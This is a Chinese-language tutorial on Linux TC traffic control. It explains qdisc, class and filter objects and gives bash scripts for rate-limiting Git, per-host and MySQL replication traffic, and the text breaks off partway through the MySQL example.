ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ç½‘ç»œæµé‡æ§åˆ¶ä»æœªå¦‚æ­¤æ¸…æ™°ï¼Œä»å†…æ ¸åŸç†åˆ°ç”Ÿäº§ç¯å¢ƒå®æˆ˜</p>
</blockquote>
<h2 data-id="heading-0">å¼•è¨€</h2>
<p>åœ¨æ—¥å¸¸å¼€å‘å’Œè¿ç»´ä¸­ï¼Œä½ æ˜¯å¦é‡åˆ°è¿‡è¿™äº›æƒ…å†µï¼Ÿ</p>
<ul>
<li>Gitæ‹‰å–ä»£ç æ—¶ï¼Œæ•´ä¸ªåŠå…¬å®¤ç½‘ç»œéƒ½è¢«æ‹–æ…¢</li>
<li>æ•°æ®åº“åŒæ­¥å æ»¡å¸¦å®½ï¼Œå½±å“çº¿ä¸ŠæœåŠ¡</li>
<li>éœ€è¦ä¸ºä¸åŒä¸šåŠ¡åˆ†é…ä¸åŒçš„ç½‘ç»œä¼˜å…ˆçº§</li>
<li>é˜²æ­¢æŸäº›IPåœ°å€æ»¥ç”¨ç½‘ç»œèµ„æº</li>
</ul>
<p>æ‰€æœ‰è¿™äº›é—®é¢˜çš„è§£å†³æ–¹æ¡ˆï¼Œéƒ½æŒ‡å‘Linuxå†…æ ¸ä¸­ä¸€ä¸ªå¼ºå¤§è€Œç¥ç§˜çš„å·¥å…·â€”â€”TCï¼ˆTraffic Controlï¼Œæµé‡æ§åˆ¶ï¼‰ã€‚æœ¬æ–‡å°†æ·±å…¥æµ…å‡ºåœ°è®²è§£TCçš„åŸç†ã€æ ¸å¿ƒæ¦‚å¿µï¼Œå¹¶é€šè¿‡å®é™…æ¡ˆä¾‹å±•ç¤ºå¦‚ä½•åº”ç”¨å®ƒè§£å†³å„ç§ç½‘ç»œæµé‡ç®¡ç†é—®é¢˜ã€‚</p>
<h2 data-id="heading-1">ä¸€ã€TCåŸç†ï¼šLinuxå†…æ ¸æµé‡æ§åˆ¶çš„æ ¸å¿ƒ</h2>
<h3 data-id="heading-2">1.1 TCåœ¨ç½‘ç»œæ ˆä¸­çš„ä½ç½®</h3>
<p>TCæ˜¯Linuxå†…æ ¸å®ç°æµé‡æ§åˆ¶çš„æ ¸å¿ƒæœºåˆ¶ã€‚è¦ç†è§£TCï¼Œé¦–å…ˆè¦æ˜ç™½å®ƒåœ¨ç½‘ç»œæ•°æ®åŒ…å¤„ç†æµç¨‹ä¸­çš„ä½ç½®ï¼š</p>
<pre><code class="hljs">æ¥æ”¶åŒ… â†’ æµé‡é™åˆ¶ â†’ è¾“å…¥å¤šè·¯åˆ†é…å™¨ â†’ æœ¬æœºå¤„ç† æˆ– è½¬å‘å¤„ç†
</code></pre>
<p>å…·ä½“æ¥è¯´ï¼š</p>
<ol>
<li>
<p><strong>æ¥æ”¶é˜¶æ®µ</strong>ï¼šæ•°æ®åŒ…ä»ç½‘ç»œæ¥å£è¿›å…¥ï¼ŒTCé¦–å…ˆè¿›è¡Œæµé‡é™åˆ¶ï¼Œä¸¢å¼ƒä¸ç¬¦åˆè§„å®šçš„åŒ…</p>
</li>
<li>
<p><strong>åˆ†å‘å†³ç­–</strong>ï¼šç»è¿‡è¾“å…¥å¤šè·¯åˆ†é…å™¨åˆ¤æ–­ï¼š</p>
<ul>
<li>ç›®çš„åœ°å€æ˜¯æœ¬æœº â†’ é€å¾€ä¸Šå±‚åè®®æ ˆï¼ˆTCP/UDPï¼‰</li>
<li>ç›®çš„åœ°å€æ˜¯å…¶ä»–ä¸»æœº â†’ è¿›å…¥è½¬å‘æµç¨‹</li>
</ul>
</li>
<li>
<p><strong>å‘é€æ§åˆ¶</strong>ï¼šè¿™æ˜¯TCå‘æŒ¥ä½œç”¨çš„ä¸»è¦ç¯èŠ‚ï¼Œå¯¹å‡ºç«™ï¼ˆegressï¼‰æµé‡è¿›è¡Œé˜Ÿåˆ—ç®¡ç†å’Œæ•´å½¢</p>
</li>
</ol>
<p><strong>å…³é”®ç‚¹</strong>ï¼šTCä¸»è¦æ§åˆ¶<strong>å‘é€</strong>ï¼ˆegressï¼‰æµé‡ï¼Œè€Œéæ¥æ”¶ï¼ˆingressï¼‰æµé‡ã€‚è¿™æ˜¯å› ä¸ºåœ¨å‘é€ç«¯æ§åˆ¶æ›´ä¸ºæœ‰æ•ˆå’Œç›´æ¥ã€‚</p>
<h3 data-id="heading-3">1.2 ä¸ºä»€ä¹ˆTCå¦‚æ­¤é‡è¦ï¼Ÿ</h3>
<ul>
<li><strong>å…¬å¹³æ€§</strong>ï¼šé˜²æ­¢å•ä¸€è¿æ¥ç‹¬å å¸¦å®½</li>
<li><strong>æœåŠ¡è´¨é‡</strong>ï¼šä¿è¯å…³é”®ä¸šåŠ¡çš„ç½‘ç»œè´¨é‡</li>
<li><strong>å¸¦å®½ç®¡ç†</strong>ï¼šåˆç†åˆ†é…æœ‰é™çš„ç½‘ç»œèµ„æº</li>
<li><strong>æµé‡æ•´å½¢</strong>ï¼šå¹³æ»‘çªå‘æµé‡ï¼Œé¿å…ç½‘ç»œæ‹¥å¡</li>
</ul>
<h2 data-id="heading-4">äºŒã€TCæ ¸å¿ƒæ¦‚å¿µè§£æ</h2>
<h3 data-id="heading-5">2.1 å››ç§æµé‡æ§åˆ¶æ–¹å¼</h3>
<p>TCæä¾›äº†å››ç§åŸºæœ¬çš„æµé‡æ§åˆ¶æ–¹å¼ï¼š</p>






























<table><thead><tr><th>æ–¹å¼</th><th>ä½œç”¨æ–¹å‘</th><th>æè¿°</th></tr></thead><tbody><tr><td>SHAPINGï¼ˆé™åˆ¶ï¼‰</td><td>å‡ºå‘</td><td>å¹³æ»‘æµé‡ï¼Œé™åˆ¶å³°å€¼é€Ÿç‡ï¼Œç±»ä¼¼"æ°´å"</td></tr><tr><td>SCHEDULINGï¼ˆè°ƒåº¦ï¼‰</td><td>å‡ºå‘</td><td>æŒ‰ä¼˜å…ˆçº§åˆ†é…å¸¦å®½ï¼Œç±»ä¼¼"äº¤é€šä¿¡å·ç¯"</td></tr><tr><td>POLICINGï¼ˆç­–ç•¥ï¼‰</td><td>å…¥å‘</td><td>æ£€æŸ¥å…¥ç«™æµé‡ï¼Œä¸¢å¼ƒè¿è§„åŒ…</td></tr><tr><td>DROPPINGï¼ˆä¸¢å¼ƒï¼‰</td><td>åŒå‘</td><td>è¶…å‡ºé™åˆ¶æ—¶ç›´æ¥ä¸¢å¼ƒæ•°æ®åŒ…</td></tr></tbody></table>
<h3 data-id="heading-6">2.2 ä¸‰å¤§æ ¸å¿ƒå¯¹è±¡</h3>
<p>TCçš„é…ç½®å›´ç»•ä¸‰ä¸ªæ ¸å¿ƒå¯¹è±¡å±•å¼€ï¼Œç†è§£å®ƒä»¬çš„å…³ç³»è‡³å…³é‡è¦ï¼š</p>
<pre><code class="hljs language-python" lang="python">qdisc é˜Ÿåˆ—è§„åˆ™--&gt; <span class="hljs-keyword">class</span> <span class="hljs-title class_">ç±»åˆ«1</span> --&gt; <span class="hljs-built_in">filter</span> è¿‡æ»¤å™¨<span class="hljs-number">1</span>
   |                 | --&gt; <span class="hljs-built_in">filter</span> è¿‡æ»¤å™¨<span class="hljs-number">2</span>
   |--&gt; C[<span class="hljs-keyword">class</span> <span class="hljs-title class_">ç±»åˆ«2</span>] --&gt; <span class="hljs-built_in">filter</span> è¿‡æ»¤å™¨<span class="hljs-number">3</span>
</code></pre>
<h4 data-id="heading-7">2.2.1 qdiscï¼ˆæ’é˜Ÿè§„åˆ™ï¼‰</h4>
<p>qdiscæ˜¯æµé‡æ§åˆ¶çš„åŸºç¡€ï¼Œæ¯ä¸ªç½‘ç»œæ¥å£éƒ½å¿…é¡»æœ‰ä¸€ä¸ªqdiscï¼ˆé»˜è®¤ä¸º<code>pfifo_fast</code>ï¼‰ã€‚</p>
<p><strong>ä¸å¯åˆ†ç±»qdisc</strong>ï¼ˆç®€å•é˜Ÿåˆ—ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ›å»ºFIFOé˜Ÿåˆ—ï¼ˆåŸºäºåŒ…æ•°é‡ï¼‰</span>
tc qdisc add dev eth0 root pfifo <span class="hljs-built_in">limit</span> 100

<span class="hljs-comment"># åˆ›å»ºFIFOé˜Ÿåˆ—ï¼ˆåŸºäºå­—èŠ‚æ•°ï¼‰</span>
tc qdisc add dev eth0 root bfifo <span class="hljs-built_in">limit</span> 10mbit
</code></pre>

























<table><thead><tr><th>ç±»å‹</th><th>æè¿°</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td>pfifo_fast</td><td>é»˜è®¤qdiscï¼Œä¸‰ä¸ªä¼˜å…ˆçº§æ³¢æ®µ</td><td>ä¸€èˆ¬ç”¨é€”</td></tr><tr><td>sfqï¼ˆéšæœºå…¬å¹³é˜Ÿåˆ—ï¼‰</td><td>æŒ‰ä¼šè¯ï¼ˆsessionï¼‰å¾ªç¯è°ƒåº¦</td><td>ä¿è¯å¤šä¸ªTCPè¿æ¥çš„å…¬å¹³æ€§</td></tr><tr><td>tbfï¼ˆä»¤ç‰Œæ¡¶è¿‡æ»¤å™¨ï¼‰</td><td>ç²¾ç¡®æ§åˆ¶é€Ÿç‡</td><td>éœ€è¦ç¨³å®šé€Ÿç‡çš„åœºæ™¯</td></tr></tbody></table>
<p><strong>å¯åˆ†ç±»qdisc</strong>ï¼ˆé«˜çº§é˜Ÿåˆ—ï¼‰ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta"># HTBï¼ˆåˆ†å±‚ä»¤ç‰Œæ¡¶ï¼‰- æ¨èä½¿ç”¨</span>
tc qdisc <span class="hljs-keyword">add</span> dev eth0 root handle <span class="hljs-number">1</span>: htb <span class="hljs-literal">default</span> <span class="hljs-number">30</span>

<span class="hljs-meta"># CBQï¼ˆåŸºäºç±»åˆ«çš„æ’é˜Ÿï¼‰</span>
tc qdisc <span class="hljs-keyword">add</span> dev eth0 root handle <span class="hljs-number">1</span>: cbq bandwidth <span class="hljs-number">100</span>Mbit avpkt <span class="hljs-number">1000</span>
</code></pre>
<h4 data-id="heading-8">2.2.2 classï¼ˆç±»ï¼‰</h4>
<p>åœ¨å¯åˆ†ç±»qdiscä¸­ï¼Œå¯ä»¥åˆ›å»ºå¤šä¸ªclasså®ç°ç²¾ç»†æ§åˆ¶ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"># åˆ›å»ºHTBæ ¹ç±»
tc <span class="hljs-keyword">class</span> <span class="hljs-title class_">add</span> <span class="hljs-title">dev</span> <span class="hljs-title">eth0</span> <span class="hljs-title">parent</span> 1: <span class="hljs-type">classid</span> 1:<span class="hljs-type">1</span> <span class="hljs-title">htb</span> <span class="hljs-title">rate</span> 100<span class="hljs-title">Mbit</span>

# åˆ›å»ºå­ç±»
tc <span class="hljs-keyword">class</span> <span class="hljs-title class_">add</span> <span class="hljs-title">dev</span> <span class="hljs-title">eth0</span> <span class="hljs-title">parent</span> 1:<span class="hljs-type">1</span> <span class="hljs-title">classid</span> 1:<span class="hljs-type">10</span> <span class="hljs-title">htb</span> <span class="hljs-title">rate</span> 30<span class="hljs-title">Mbit</span> <span class="hljs-title">ceil</span> 50<span class="hljs-title">Mbit</span>
tc <span class="hljs-keyword">class</span> <span class="hljs-title class_">add</span> <span class="hljs-title">dev</span> <span class="hljs-title">eth0</span> <span class="hljs-title">parent</span> 1:<span class="hljs-type">1</span> <span class="hljs-title">classid</span> 1:<span class="hljs-type">20</span> <span class="hljs-title">htb</span> <span class="hljs-title">rate</span> 20<span class="hljs-title">Mbit</span> <span class="hljs-title">ceil</span> 30<span class="hljs-title">Mbit</span>
</code></pre>
<p><strong>å‚æ•°è¯´æ˜</strong>ï¼š</p>
<ul>
<li><code>rate</code>ï¼šä¿è¯å¸¦å®½ï¼Œå¿…é¡»æ»¡è¶³</li>
<li><code>ceil</code>ï¼šæœ€å¤§å¸¦å®½ï¼Œå¯å€Ÿç”¨ç©ºé—²å¸¦å®½</li>
<li><code>burst</code>ï¼šçªå‘æµé‡å®¹é‡</li>
</ul>
<h4 data-id="heading-9">2.2.3 filterï¼ˆè¿‡æ»¤å™¨ï¼‰</h4>
<p>è¿‡æ»¤å™¨å†³å®šæ•°æ®åŒ…è¿›å…¥å“ªä¸ªclassï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åŸºäºç«¯å£è¿‡æ»¤</span>
tc <span class="hljs-built_in">filter</span> add dev eth0 protocol ip parent <span class="hljs-number">1</span>:<span class="hljs-number">0</span> prio <span class="hljs-number">1</span> u32 <span class="hljs-keyword">match</span> ip dport <span class="hljs-number">22</span> <span class="hljs-number">0xffff</span> flowid <span class="hljs-number">1</span>:<span class="hljs-number">10</span>

<span class="hljs-comment"># åŸºäºIPåœ°å€è¿‡æ»¤</span>
tc <span class="hljs-built_in">filter</span> add dev eth0 protocol ip parent <span class="hljs-number">1</span>:<span class="hljs-number">0</span> prio <span class="hljs-number">1</span> u32 <span class="hljs-keyword">match</span> ip dst <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> flowid <span class="hljs-number">1</span>:<span class="hljs-number">20</span>
</code></pre>
<h3 data-id="heading-10">2.3 æµé‡åˆ†ç±»çš„ä¸‰ç§æ–¹å¼</h3>
<ol>
<li><strong>tc filter</strong>ï¼šæœ€çµæ´»ï¼Œæ”¯æŒå„ç§åŒ¹é…æ¡ä»¶</li>
<li><strong>æœåŠ¡ç±»å‹ï¼ˆToSï¼‰</strong> ï¼šæ ¹æ®IPå¤´éƒ¨çš„ToSå­—æ®µ</li>
<li><strong>skb-&gt;priority</strong>ï¼šåº”ç”¨ç¨‹åºé€šè¿‡socketé€‰é¡¹è®¾ç½®</li>
</ol>
<h2 data-id="heading-11">ä¸‰ã€TCå‘½ä»¤å®Œå…¨æŒ‡å—</h2>
<h3 data-id="heading-12">3.1 åŸºæœ¬å‘½ä»¤æ ¼å¼</h3>
<pre><code class="hljs language-css" lang="css">tc <span class="hljs-selector-attr">[é€‰é¡¹]</span> å¯¹è±¡ å‘½ä»¤ è®¾å¤‡ å‚æ•°
</code></pre>
<p><strong>å¯¹è±¡ç±»å‹</strong>ï¼š</p>
<ul>
<li><code>qdisc</code>ï¼šæ’é˜Ÿè§„åˆ™</li>
<li><code>class</code>ï¼šç±»åˆ«</li>
<li><code>filter</code>ï¼šè¿‡æ»¤å™¨</li>
</ul>
<p><strong>å¸¸ç”¨å‘½ä»¤</strong>ï¼š</p>



































<table><thead><tr><th>å‘½ä»¤</th><th>æè¿°</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><code>add</code></td><td>æ·»åŠ è§„åˆ™</td><td><code>tc qdisc add dev eth0 root htb</code></td></tr><tr><td><code>del</code></td><td>åˆ é™¤è§„åˆ™</td><td><code>tc qdisc del dev eth0 root</code></td></tr><tr><td><code>change</code></td><td>ä¿®æ”¹è§„åˆ™</td><td><code>tc class change dev eth0 parent 1: classid 1:1 htb rate 50Mbit</code></td></tr><tr><td><code>replace</code></td><td>æ›¿æ¢è§„åˆ™</td><td><code>tc filter replace dev eth0 parent 1:0 protocol ip u32 match ip dst 192.168.1.1 flowid 1:10</code></td></tr><tr><td><code>show</code></td><td>æ˜¾ç¤ºè§„åˆ™</td><td><code>tc -s qdisc show dev eth0</code></td></tr></tbody></table>
<h3 data-id="heading-13">3.2 å•ä½æ¢ç®—è¦ç‚¹</h3>
<p><strong>å¸¸è§é”™è¯¯</strong>ï¼šæ··æ·† bitï¼ˆæ¯”ç‰¹ï¼‰å’Œ Byteï¼ˆå­—èŠ‚ï¼‰</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># æ­£ç¡®ç¤ºä¾‹</span>
tc class add dev eth0 parent 1:1 classid 1:10 htb rate 1mbit  <span class="hljs-comment"># 1 Mbps = 125 KB/s</span>
tc class add dev eth0 parent 1:1 classid 1:20 htb rate 1024kbit  <span class="hljs-comment"># 1024 Kbps = 128 KB/s</span>

<span class="hljs-comment"># å¸¦å®½å•ä½æ¢ç®—</span>
1 <span class="hljs-attr">Gbit</span> = <span class="hljs-number">1000</span> Mbit = <span class="hljs-number">1000000</span> Kbit
1 <span class="hljs-attr">GB</span> = <span class="hljs-number">1024</span> MB = <span class="hljs-number">1048576</span> KB
1 <span class="hljs-attr">Byte</span> = <span class="hljs-number">8</span> bits
</code></pre>
<h2 data-id="heading-14">å››ã€å®æˆ˜åº”ç”¨ï¼šä»å…¥é—¨åˆ°ç²¾é€š</h2>
<h3 data-id="heading-15">4.1 Gitä»“åº“é™é€Ÿæ–¹æ¡ˆ</h3>
<p><strong>åœºæ™¯</strong>ï¼šGitæ‹‰å–ä»£ç å æ»¡å¸¦å®½ï¼Œå½±å“å…¶ä»–ä¸šåŠ¡</p>
<h4 data-id="heading-16">æ–¹æ¡ˆä¸€ï¼šåŸºäºç«¯å£é™é€Ÿï¼ˆGit over SSHï¼‰</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># git-limit-port.sh</span>
<span class="hljs-comment"># Git SSHç«¯å£(22)é™é€Ÿæ–¹æ¡ˆ</span>

DEV=<span class="hljs-string">"eth0"</span>
RATE=<span class="hljs-string">"1mbit"</span>  <span class="hljs-comment"># é™åˆ¶ä¸º1 Mbps</span>
CEIL=<span class="hljs-string">"1.5mbit"</span>  <span class="hljs-comment"># æœ€å¤§1.5 Mbps</span>
BURST=<span class="hljs-string">"15k"</span>

<span class="hljs-comment"># æ¸…ç†ç°æœ‰è§„åˆ™</span>
tc qdisc del dev <span class="hljs-variable">$DEV</span> root 2&gt;/dev/null

<span class="hljs-comment"># åˆ›å»ºHTBé˜Ÿåˆ—</span>
tc qdisc add dev <span class="hljs-variable">$DEV</span> root handle 1: htb default 999

<span class="hljs-comment"># åˆ›å»ºé»˜è®¤ç±»åˆ«ï¼ˆä¸é™é€Ÿï¼‰</span>
tc class add dev <span class="hljs-variable">$DEV</span> parent 1: classid 1:999 htb rate 1000mbit ceil 1000mbit

<span class="hljs-comment"># åˆ›å»ºé™é€Ÿç±»åˆ«</span>
tc class add dev <span class="hljs-variable">$DEV</span> parent 1: classid 1:10 htb rate <span class="hljs-variable">$RATE</span> ceil <span class="hljs-variable">$CEIL</span> burst <span class="hljs-variable">$BURST</span>

<span class="hljs-comment"># æ·»åŠ SFQé˜²æ­¢å•ä¸€è¿æ¥ç‹¬å </span>
tc qdisc add dev <span class="hljs-variable">$DEV</span> parent 1:10 handle 10: sfq perturb 10

<span class="hljs-comment"># åˆ›å»ºè¿‡æ»¤å™¨ï¼šGit SSHç«¯å£(22)è¿›å…¥é™é€Ÿç±»åˆ«</span>
tc filter add dev <span class="hljs-variable">$DEV</span> protocol ip parent 1: prio 1 u32 \
  match ip sport 22 0xffff flowid 1:10

<span class="hljs-comment"># å…¶ä»–æ‰€æœ‰æµé‡èµ°é»˜è®¤ç±»åˆ«</span>
tc filter add dev <span class="hljs-variable">$DEV</span> protocol ip parent 1: prio 2 u32 \
  match ip dst 0.0.0.0/0 flowid 1:999
  
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Git SSHé™é€Ÿå·²è®¾ç½®ï¼š<span class="hljs-variable">${RATE}</span>ï¼Œä¿å­˜åˆ°/etc/rc.localå®ç°å¼€æœºè‡ªå¯"</span>
</code></pre>
<h4 data-id="heading-17">æ–¹æ¡ˆäºŒï¼šåŸºäºIPåœ°å€é™é€Ÿ</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># git-limit-ip.sh</span>
<span class="hljs-comment"># é’ˆå¯¹ç‰¹å®šIPçš„Gité™é€Ÿ</span>

DEV=<span class="hljs-string">"eth0"</span>
GIT_SERVER=<span class="hljs-string">"github.com"</span>  <span class="hljs-comment"># å¯æ›¿æ¢ä¸ºå®é™…GitæœåŠ¡å™¨IP</span>
LIMIT_RATE=<span class="hljs-string">"512kbit"</span>    <span class="hljs-comment"># é™åˆ¶é€Ÿç‡</span>
MAX_RATE=<span class="hljs-string">"1mbit"</span>        <span class="hljs-comment"># æœ€å¤§é€Ÿç‡</span>
LOCAL_NET=<span class="hljs-string">"192.168.1.0/24"</span>  <span class="hljs-comment"># å†…ç½‘ç½‘æ®µ</span>

<span class="hljs-comment"># è·å–GitæœåŠ¡å™¨IPï¼ˆå¦‚æœä½¿ç”¨åŸŸåï¼‰</span>
GIT_IP=$(dig +short <span class="hljs-variable">$GIT_SERVER</span> | <span class="hljs-built_in">head</span> -1)
[ -z <span class="hljs-string">"<span class="hljs-variable">$GIT_IP</span>"</span> ] &amp;&amp; GIT_IP=<span class="hljs-string">"192.168.1.100"</span>  <span class="hljs-comment"># å¤‡ç”¨IP</span>

<span class="hljs-comment"># æ¸…ç†è§„åˆ™</span>
tc qdisc del dev <span class="hljs-variable">$DEV</span> root 2&gt;/dev/null

<span class="hljs-comment"># åˆ›å»ºHTBé˜Ÿåˆ—</span>
tc qdisc add dev <span class="hljs-variable">$DEV</span> root handle 1: htb default 9999

<span class="hljs-comment"># åˆ›å»ºæ ¹ç±»ï¼ˆæ€»å¸¦å®½100Mbpsï¼‰</span>
tc class add dev <span class="hljs-variable">$DEV</span> parent 1: classid 1:1 htb rate 100mbit

<span class="hljs-comment"># åˆ›å»ºå„ç±»åˆ«</span>
<span class="hljs-comment"># 1. GitæœåŠ¡å™¨é™é€Ÿ</span>
tc class add dev <span class="hljs-variable">$DEV</span> parent 1:1 classid 1:10 htb rate <span class="hljs-variable">$LIMIT_RATE</span> ceil <span class="hljs-variable">$MAX_RATE</span> burst 15k
<span class="hljs-comment"># 2. å†…ç½‘ä¸é™é€Ÿ</span>
tc class add dev <span class="hljs-variable">$DEV</span> parent 1:1 classid 1:20 htb rate 90mbit ceil 100mbit burst 15k
<span class="hljs-comment"># 3. å…¶ä»–æµé‡</span>
tc class add dev <span class="hljs-variable">$DEV</span> parent 1:1 classid 1:9999 htb rate 10mbit ceil 100mbit burst 15k

<span class="hljs-comment"># ä¸ºæ¯ä¸ªç±»åˆ«æ·»åŠ SFQ</span>
<span class="hljs-keyword">for</span> classid <span class="hljs-keyword">in</span> 10 20 9999; <span class="hljs-keyword">do</span>
  tc qdisc add dev <span class="hljs-variable">$DEV</span> parent 1:<span class="hljs-variable">$classid</span> handle <span class="hljs-variable">${classid}</span>0: sfq perturb 10
<span class="hljs-keyword">done</span>

<span class="hljs-comment"># è®¾ç½®è¿‡æ»¤å™¨ï¼ˆæ³¨æ„ä¼˜å…ˆçº§prioï¼‰</span>
<span class="hljs-comment"># è§„åˆ™1ï¼šå†…ç½‘ä¸é™é€Ÿï¼ˆæœ€é«˜ä¼˜å…ˆçº§ï¼‰</span>
tc filter add dev <span class="hljs-variable">$DEV</span> parent 1: protocol ip prio 1 u32 \
  match ip dst <span class="hljs-variable">$LOCAL_NET</span> flowid 1:20
  
<span class="hljs-comment"># è§„åˆ™2ï¼šGitæœåŠ¡å™¨é™é€Ÿ</span>
tc filter add dev <span class="hljs-variable">$DEV</span> parent 1: protocol ip prio 2 u32 \
  match ip dst <span class="hljs-variable">$GIT_IP</span> flowid 1:10
  
<span class="hljs-comment"># è§„åˆ™3ï¼šé»˜è®¤è§„åˆ™</span>
tc filter add dev <span class="hljs-variable">$DEV</span> parent 1: protocol ip prio 3 u32 \
  match ip dst 0.0.0.0/0 flowid 1:9999
  
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Git IPé™é€Ÿé…ç½®å®Œæˆ"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"GitæœåŠ¡å™¨: <span class="hljs-variable">$GIT_IP</span> é™é€Ÿ: <span class="hljs-variable">$LIMIT_RATE</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"å†…ç½‘ç½‘æ®µ: <span class="hljs-variable">$LOCAL_NET</span> ä¸é™é€Ÿ"</span>
</code></pre>
<p><strong>å…³é”®æŠ€å·§</strong>ï¼š</p>
<ul>
<li>è¿‡æ»¤å™¨ä¼˜å…ˆçº§ï¼ˆ<code>prio</code>ï¼‰å¾ˆé‡è¦ï¼Œæ•°å­—è¶Šå°ä¼˜å…ˆçº§è¶Šé«˜</li>
<li>å†…ç½‘è§„åˆ™åº”è¯¥æ”¾åœ¨å‰é¢ï¼ˆprioå€¼å°ï¼‰</li>
<li>ä½¿ç”¨<code>sfq</code>é˜²æ­¢å•ä¸ªè¿æ¥ç‹¬å å¸¦å®½</li>
</ul>
<h3 data-id="heading-18">4.2 ç”Ÿäº§ç¯å¢ƒå¤šä¸»æœºæµé‡æ§åˆ¶</h3>
<p><strong>åœºæ™¯</strong>ï¼šä¸ºä¸åŒæœåŠ¡å™¨åˆ†é…ä¸åŒå¸¦å®½</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># multi-host-limit.sh</span>
<span class="hljs-comment"># ä¸ºä¸åŒç›®æ ‡ä¸»æœºåˆ†é…ä¸åŒå¸¦å®½</span>

DEV=<span class="hljs-string">"eth0"</span>
TOTAL_BW=<span class="hljs-string">"10mbit"</span>

<span class="hljs-comment"># ç›®æ ‡ä¸»æœºåŠå¸¦å®½é…ç½®</span>
<span class="hljs-built_in">declare</span> -A HOSTS=(
  [<span class="hljs-string">"192.168.1.10"</span>]=<span class="hljs-string">"3mbit"</span>  <span class="hljs-comment"># æ•°æ®åº“æœåŠ¡å™¨</span>
  [<span class="hljs-string">"192.168.1.20"</span>]=<span class="hljs-string">"2mbit"</span>  <span class="hljs-comment"># æ–‡ä»¶æœåŠ¡å™¨  </span>
  [<span class="hljs-string">"192.168.1.30"</span>]=<span class="hljs-string">"1mbit"</span>  <span class="hljs-comment"># ç›‘æ§æœåŠ¡å™¨</span>
)

<span class="hljs-comment"># æ¸…ç†å¹¶åˆå§‹åŒ–</span>
tc qdisc del dev <span class="hljs-variable">$DEV</span> root 2&gt;/dev/null
tc qdisc add dev <span class="hljs-variable">$DEV</span> root handle 1: htb default 999
tc class add dev <span class="hljs-variable">$DEV</span> parent 1: classid 1:1 htb rate <span class="hljs-variable">$TOTAL_BW</span>

<span class="hljs-comment"># ä¸ºæ¯ä¸ªä¸»æœºåˆ›å»ºç±»åˆ«</span>
CLASS_ID=10
<span class="hljs-keyword">for</span> HOST <span class="hljs-keyword">in</span> <span class="hljs-string">"<span class="hljs-variable">${!HOSTS[@]}</span>"</span>; <span class="hljs-keyword">do</span>
  BW=<span class="hljs-variable">${HOSTS[$HOST]}</span>
  tc class add dev <span class="hljs-variable">$DEV</span> parent 1:1 classid 1:<span class="hljs-variable">$CLASS_ID</span> htb rate <span class="hljs-variable">$BW</span> ceil <span class="hljs-variable">$BW</span> burst 15k
  tc qdisc add dev <span class="hljs-variable">$DEV</span> parent 1:<span class="hljs-variable">$CLASS_ID</span> handle <span class="hljs-variable">${CLASS_ID}</span>0: sfq perturb 10
  tc filter add dev <span class="hljs-variable">$DEV</span> parent 1: protocol ip prio 5 u32 \
    match ip dst <span class="hljs-variable">$HOST</span> flowid 1:<span class="hljs-variable">$CLASS_ID</span>
  ((CLASS_ID++))
<span class="hljs-keyword">done</span>

<span class="hljs-comment"># é»˜è®¤ç±»åˆ«</span>
tc class add dev <span class="hljs-variable">$DEV</span> parent 1:1 classid 1:999 htb rate 4mbit ceil 4mbit
tc qdisc add dev <span class="hljs-variable">$DEV</span> parent 1:999 handle 9990: sfq perturb 10
</code></pre>
<h3 data-id="heading-19">4.3 MySQLæ•°æ®åº“åŒæ­¥é™é€Ÿ</h3>
<p><strong>åœºæ™¯</strong>ï¼šæ•°æ®åº“ä¸»ä»åŒæ­¥ä¸å½±å“çº¿ä¸Šä¸šåŠ¡</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># mysql-sync-limit.sh</span>
<span class="hljs-comment"># MySQLåŒå‘åŒæ­¥é™é€Ÿæ–¹æ¡ˆ</span>

<span class="hljs-comment"># èŠ‚ç‚¹é…ç½®</span>
LOCAL_IP=<span class="hljs-string">"10.9.57.162"</span>
PEER_IP=<span class="hljs-string">"10.12.1.45"</span>
LIMIT_RATE=<span class="hljs-string">"8mbit"</span>  <span class="hljs-comment"># é™åˆ¶ä¸º8 Mbps</span>
DEV=<span class="hljs-string">"eth0"</span>

